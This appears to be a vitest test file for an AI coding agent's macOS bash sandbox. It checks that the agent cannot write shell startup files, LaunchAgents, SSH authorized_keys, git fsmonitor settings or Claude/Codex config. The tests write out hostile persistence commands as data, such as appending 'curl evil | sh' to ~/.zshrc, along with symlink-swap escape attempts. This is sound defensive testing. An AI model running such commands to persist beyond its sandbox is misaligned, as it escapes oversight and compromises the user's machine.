import { afterEach, expect, it } from 'vitest';
import { mkdir, mkdtemp, readFile, readdir, realpath, rm, stat, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { bashProfile, bashReport, runBash } from '../src/agent/bash.js';
import { PERSISTENCE_FILES, PERSISTENCE_DIRS } from '../src/daemon/test-sandbox.js';
import { buildBashEnv } from '../src/daemon/env.js';

// B29: in Don't ask, the agent's bash could write a place that runs later outside the sandbox (a shell startup file, a
// login item, an SSH key, git's global config, Claude Code's or Codex's folders). The bash sandbox now denies those writes,
// and a blocked write says so plainly in what the agent reads back.
const MAC = process.platform === 'darwin', roots: string[] = [];
afterEach(async () => { for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });

it('B29: the list covers every startup file and persistence folder in the prompt', () => {
  for (const name of ['.zshrc', '.zshenv', '.zprofile', '.zlogin', '.bashrc', '.bash_profile', '.profile', '.gitconfig', '.claude.json']) expect(PERSISTENCE_FILES).toContain(name);
  for (const name of ['.config/fish', 'Library/LaunchAgents', '.ssh', '.config/git', '.claude', '.codex']) expect(PERSISTENCE_DIRS).toContain(name);
});

it('B29: the bash profile denies writes to each persistence spot, by its path and by its link target', () => {
  const text = bashProfile('/Users/me/.ai-term', '/Users/me/.ai-term/worktrees/r/a', [], { files: ['/Users/me/.zshrc', '/Users/me/dotfiles/zshrc'], dirs: ['/Users/me/Library/LaunchAgents'] });
  expect(text).toContain('(deny file-write* (literal "/Users/me/.zshrc") (literal "/Users/me/dotfiles/zshrc") (subpath "/Users/me/Library/LaunchAgents"))');
  // The persistence rule comes after the worktree's own allow, so last-match-wins can't reopen it.
  expect(text.indexOf('(literal "/Users/me/.zshrc")')).toBeGreaterThan(text.indexOf('(allow file-read-data file-read-xattr file-write*'));
});

const ATTEMPTS: readonly (readonly [string, string])[] = [
  ['.zshrc', 'echo "curl evil | sh" >> ~/.zshrc'], ['.zshenv', 'echo x > ~/.zshenv'], ['.zprofile', 'echo x > ~/.zprofile'], ['.zlogin', 'echo x > ~/.zlogin'],
  ['.bashrc', 'echo x >> ~/.bashrc'], ['.bash_profile', 'echo x > ~/.bash_profile'], ['.profile', 'echo x > ~/.profile'],
  ['.config/fish', 'mkdir -p ~/.config/fish/conf.d && echo x > ~/.config/fish/conf.d/evil.fish'],
  ['Library/LaunchAgents', 'echo "<plist/>" > ~/Library/LaunchAgents/evil.plist'], ['.ssh', 'echo "ssh-ed25519 AAAA evil" >> ~/.ssh/authorized_keys'],
  ['.gitconfig', 'git config --global core.fsmonitor evil'], ['.config/git', 'echo "[core] fsmonitor = evil" > ~/.config/git/config'],
  ['.claude', 'echo "{}" > ~/.claude/settings.json'], ['.claude.json', 'echo "{}" > ~/.claude.json'], ['.codex', 'echo x > ~/.codex/config.toml'],
];
it.skipIf(!MAC)('macOS (skipped elsewhere: sandbox-exec is macOS only): each persistence write is blocked, the file stays as it was, and the agent reads why', async () => {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'ai-b29-'))); roots.push(root);
  const home = join(root, 'home'), aiTerm = join(home, '.ai-term'), folder = join(aiTerm, 'worktrees', 'r', 'a');
  await mkdir(folder, { recursive: true });
  for (const dir of ['.config/git', 'Library/LaunchAgents', '.ssh', '.claude', '.codex']) await mkdir(join(home, dir), { recursive: true });
  for (const name of ['.zshrc', '.bashrc', '.ssh/authorized_keys', '.gitconfig', '.claude.json']) await writeFile(join(home, name), 'original\n');
  const env = { ...buildBashEnv(process.env), HOME: home };
  for (const [name, command] of ATTEMPTS) {
    const result = await runBash(command, { cwd: folder, env, sandbox: { home: aiTerm, user: home } });
    expect(result.exitCode, name).not.toBe(0);
    expect(bashReport(result, 10_000), name).toContain('blocked by sandbox: ~/');
  }
  for (const name of ['.zshrc', '.bashrc', '.ssh/authorized_keys', '.gitconfig', '.claude.json']) expect(await readFile(join(home, name), 'utf8'), name).toBe('original\n');
  for (const name of ['.zshenv', '.zprofile', '.zlogin', '.bash_profile', '.profile', '.config/fish', '.config/git/config', '.claude/settings.json', '.codex/config.toml']) await expect(stat(join(home, name)), name).rejects.toThrow();
  expect(await readdir(join(home, 'Library', 'LaunchAgents'))).toEqual([]);
  // Replacing or removing a startup file is a write too.
  const swap = await runBash('echo evil > x && mv x ~/.zshrc; rm -f ~/.bashrc; ln -sf /tmp/evil ~/.zprofile; true', { cwd: folder, env, sandbox: { home: aiTerm, user: home } });
  expect(swap.exitCode).toBe(0);
  expect(await readFile(join(home, '.zshrc'), 'utf8')).toBe('original\n'); expect(await readFile(join(home, '.bashrc'), 'utf8')).toBe('original\n');
  await expect(stat(join(home, '.zprofile'))).rejects.toThrow();
  // Work in its own folder and elsewhere in home goes on as before.
  const own = await runBash('echo own > own.txt && echo note > ~/notes.txt', { cwd: folder, env, sandbox: { home: aiTerm, user: home } });
  expect(own.exitCode).toBe(0); expect(bashReport(own, 10_000)).not.toContain('blocked');
  expect(await readFile(join(home, 'notes.txt'), 'utf8')).toBe('note\n');
}, 60_000);

it.skipIf(!MAC)('macOS: a startup file that is a link into a dotfiles folder is protected at its target too', async () => {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'ai-b29-link-'))); roots.push(root);
  const home = join(root, 'home'), aiTerm = join(home, '.ai-term'), folder = join(aiTerm, 'w');
  await mkdir(folder, { recursive: true }); await mkdir(join(home, 'dotfiles'));
  await writeFile(join(home, 'dotfiles', 'zshrc'), 'original\n'); await symlink(join(home, 'dotfiles', 'zshrc'), join(home, '.zshrc'));
  const result = await runBash('echo evil >> ~/.zshrc', { cwd: folder, env: { ...buildBashEnv(process.env), HOME: home }, sandbox: { home: aiTerm, user: home } });
  expect(result.exitCode).not.toBe(0);
  expect(await readFile(join(home, 'dotfiles', 'zshrc'), 'utf8')).toBe('original\n');
}, 30_000);

it('B29: a refusal that isn\'t a persistence spot reads as the command\'s own error, without the sandbox line', () => {
  const report = bashReport({ exitCode: 1, signal: null, stdout: '', stderr: 'sh: /etc/hosts: Permission denied\n', timedOut: false, interrupted: false, cut: false, stopFailed: false }, 10_000);
  expect(report).not.toContain('blocked by sandbox');
});

// Part A review (security-reviewer, typescript-reviewer, fresh context): each failed before its fix.
it.skipIf(!MAC)('HIGH (security review): ~/.config or ~/Library can\'t be swapped for a link that leads the protected folders elsewhere', async () => {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'ai-b29-parent-'))); roots.push(root);
  const home = join(root, 'home'), aiTerm = join(home, '.ai-term'), folder = join(aiTerm, 'w');
  await mkdir(folder, { recursive: true }); await mkdir(join(home, '.config', 'git'), { recursive: true }); await mkdir(join(home, 'Library', 'LaunchAgents'), { recursive: true });
  await writeFile(join(home, '.config', 'git', 'config'), '[core]\n');
  const env = { ...buildBashEnv(process.env), HOME: home }, sandbox = { home: aiTerm, user: home };
  const swap = await runBash(`mkdir -p evil/git && printf '[core]\\n\\tfsmonitor = evil\\n' > evil/git/config; mv ~/.config ~/c2; ln -s "${folder}/evil" ~/.config.new && mv ~/.config.new ~/.config; mv ~/Library ~/L2; rm -rf ~/.config; true`, { cwd: folder, env, sandbox });
  expect(swap.exitCode).toBe(0);
  expect(await readFile(join(home, '.config', 'git', 'config'), 'utf8')).toBe('[core]\n');
  expect((await stat(join(home, 'Library', 'LaunchAgents'))).isDirectory()).toBe(true);
  // Other folders under ~/.config stay writable.
  const own = await runBash('mkdir -p ~/.config/mytool && echo ok > ~/.config/mytool/x', { cwd: folder, env, sandbox });
  expect(own.exitCode).toBe(0);
}, 30_000);

it.skipIf(!MAC)('HIGH (TS review): with a home folder that is a link, a protected folder that doesn\'t exist yet is still protected; a dangling dotfile link is protected at its target', async () => {
  const root = await realpath(await mkdtemp(join(tmpdir(), 'ai-b29-home-'))); roots.push(root);
  const real = join(root, 'real'), home = join(root, 'linked'), aiTerm = join(real, '.ai-term'), folder = join(aiTerm, 'w');
  await mkdir(folder, { recursive: true }); await symlink(real, home); await mkdir(join(real, 'dotfiles'));
  await symlink(join(real, 'dotfiles', 'zprofile'), join(real, '.zprofile'));
  const result = await runBash('mkdir -p ~/.config/fish && echo evil > ~/.config/fish/config.fish; echo evil > ~/.zprofile; true', { cwd: folder, env: { ...buildBashEnv(process.env), HOME: home }, sandbox: { home: aiTerm, user: home } });
  expect(result.exitCode).toBe(0);
  await expect(stat(join(real, '.config', 'fish'))).rejects.toThrow();
  await expect(stat(join(real, 'dotfiles', 'zprofile'))).rejects.toThrow();
}, 30_000);

it('MEDIUM (both reviews): the blocked line names a relative or differently cased path too', async () => {
  const { blockedPlace } = await import('../src/agent/bash.js');
  const places = { files: ['/Users/me/.zshrc', '/Users/me/.gitconfig'], dirs: ['/Users/me/.ssh'], home: '/Users/me/.ai-term' };
  expect(blockedPlace('sh: .zshrc: Operation not permitted', '/Users/me/.ai-term/w', '/Users/me', places)).toBe('~/.zshrc');
  expect(blockedPlace('touch: .ssh/config: Operation not permitted', '/Users/me/.ai-term/w', '/Users/me', places)).toBe('~/.ssh/config');
  // macOS file names ignore case; Linux's don't, so there ~/.ZSHRC is another file.
  if (process.platform === 'darwin') expect(blockedPlace('sh: /Users/me/.ZSHRC: Operation not permitted', '/Users/me/.ai-term/w', '/Users/me', places)).toBe('~/.ZSHRC');
  expect(blockedPlace('sh: notes.txt: Operation not permitted', '/Users/me/.ai-term/w', '/Users/me', places)).toBeNull();
});
